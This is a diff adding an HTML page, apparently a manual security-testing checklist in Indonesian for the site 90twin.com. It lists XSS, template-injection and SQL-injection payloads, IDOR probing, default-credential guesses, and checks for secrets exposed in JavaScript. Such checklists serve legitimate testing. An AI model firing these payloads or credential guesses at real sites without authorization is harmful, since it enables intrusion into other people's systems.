@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS & Security Manual Test - 90twin.com</title>
+  <style>
+    body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+    h2 { color: #ff6600; }
+    .test { background: #2a2a2a; padding: 10px; margin: 10px 0; border-left: 3px solid #ff6600; }
+    .payload { color: #ffff00; font-size: 12px; word-break: break-all; }
+    .desc { color: #aaaaaa; font-size: 11px; }
+    table { width: 100%; border-collapse: collapse; }
+    td, th { border: 1px solid #444; padding: 8px; text-align: left; }
+    th { background: #333; }
+    .risk-high { color: #ff4444; }
+    .risk-med { color: #ffaa00; }
+    .risk-low { color: #44ff44; }
+  </style>
+</head>
+<body>
+<h1>Manual Security Test Guide - 90twin.com</h1>
+
+<h2>1. XSS (Cross-Site Scripting) Payloads</h2>
+<p class="desc">Masukkan payload berikut ke semua input field, search box, URL parameter:</p>
+
+<div class="test">
+  <strong>Basic XSS:</strong><br>
+  <span class="payload">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+</div>
+<div class="test">
+  <strong>Img onerror:</strong><br>
+  <span class="payload">&lt;img src=x onerror=alert('XSS')&gt;</span>
+</div>
+<div class="test">
+  <strong>SVG XSS:</strong><br>
+  <span class="payload">&lt;svg onload=alert('XSS')&gt;</span>
+</div>
+<div class="test">
+  <strong>DOM XSS via URL hash (untuk SPA):</strong><br>
+  <span class="payload">https://90twin.com/#/&lt;img src=x onerror=alert(1)&gt;</span><br>
+  <span class="payload">https://90twin.com/#/%3Cscript%3Ealert(1)%3C/script%3E</span>
+</div>
+<div class="test">
+  <strong>JavaScript URI:</strong><br>
+  <span class="payload">javascript:alert('XSS')</span>
+</div>
+<div class="test">
+  <strong>Template Injection (Vue/Angular):</strong><br>
+  <span class="payload">{{7*7}} → jika muncul 49, ada template injection!</span><br>
+  <span class="payload">{{constructor.constructor('alert(1)')()}}</span>
+</div>
+
+<h2>2. SQL Injection Payloads (untuk form/API)</h2>
+<div class="test">
+  <span class="payload">' OR '1'='1</span><br>
+  <span class="payload">' OR 1=1--</span><br>
+  <span class="payload">" OR 1=1--</span><br>
+  <span class="payload">admin'--</span><br>
+  <span class="payload">1' AND SLEEP(5)--  (time-based blind)</span>
+</div>
+
+<h2>3. IDOR (Insecure Direct Object Reference)</h2>
+<div class="test">
+  <p class="desc">Jika ada URL seperti /api/user/123 atau /profile/123:</p>
+  <span class="payload">Coba ganti angka: /api/user/1, /api/user/2, /api/user/124</span><br>
+  <span class="payload">Coba akses resource user lain tanpa login</span>
+</div>
+
+<h2>4. Authentication Testing</h2>
+<table>
+  <tr><th>Test</th><th>Cara</th><th>Risk</th></tr>
+  <tr>
+    <td>Default credentials</td>
+    <td>admin/admin, admin/password, admin/123456</td>
+    <td class="risk-high">HIGH</td>
+  </tr>
+  <tr>
+    <td>Brute force protection</td>
+    <td>Login salah 10x - apakah diblokir?</td>
+    <td class="risk-high">HIGH</td>
+  </tr>
+  <tr>
+    <td>Password reset flaw</td>
+    <td>Coba reset password, apakah token bisa ditebak?</td>
+    <td class="risk-high">HIGH</td>
+  </tr>
+  <tr>
+    <td>JWT token</td>
+    <td>Decode di jwt.io - cek algorithm, exp, isi sensitif</td>
+    <td class="risk-med">MEDIUM</td>
+  </tr>
+  <tr>
+    <td>Session fixation</td>
+    <td>Apakah session ID berubah setelah login?</td>
+    <td class="risk-med">MEDIUM</td>
+  </tr>
+</table>
+
+<h2>5. API Security (buka DevTools → Network tab)</h2>
+<div class="test">
+  <p class="desc">Hal yang perlu dicek di tab Network browser:</p>
+  ✓ URL API endpoint yang dipanggil<br>
+  ✓ Apakah ada token/key di URL (bukan header)?<br>
+  ✓ Apakah response mengandung data sensitif berlebih?<br>
+  ✓ Apakah ada endpoint tanpa autentikasi?<br>
+  ✓ Apakah HTTPS digunakan untuk semua request?
+</div>
+
+<h2>6. Security Headers Checker</h2>
+<p>Buka: <a href="https://securityheaders.com/?q=90twin.com&followRedirects=on" target="_blank" style="color:#00aaff">https://securityheaders.com/?q=90twin.com</a></p>
+<p>Buka: <a href="https://www.ssllabs.com/ssltest/analyze.html?d=90twin.com" target="_blank" style="color:#00aaff">https://www.ssllabs.com/ssltest/analyze.html?d=90twin.com</a></p>
+
+<h2>7. Source Code Review (di browser)</h2>
+<div class="test">
+  <p class="desc">Di browser, tekan F12 → Sources:</p>
+  ✓ Cari kata kunci: <span class="payload">password, secret, key, token, api_key, apikey, auth</span><br>
+  ✓ Periksa file .env yang mungkin ter-bundle di JS<br>
+  ✓ Cek apakah ada hardcoded credentials di JavaScript
+</div>
+
+</body>
+</html>
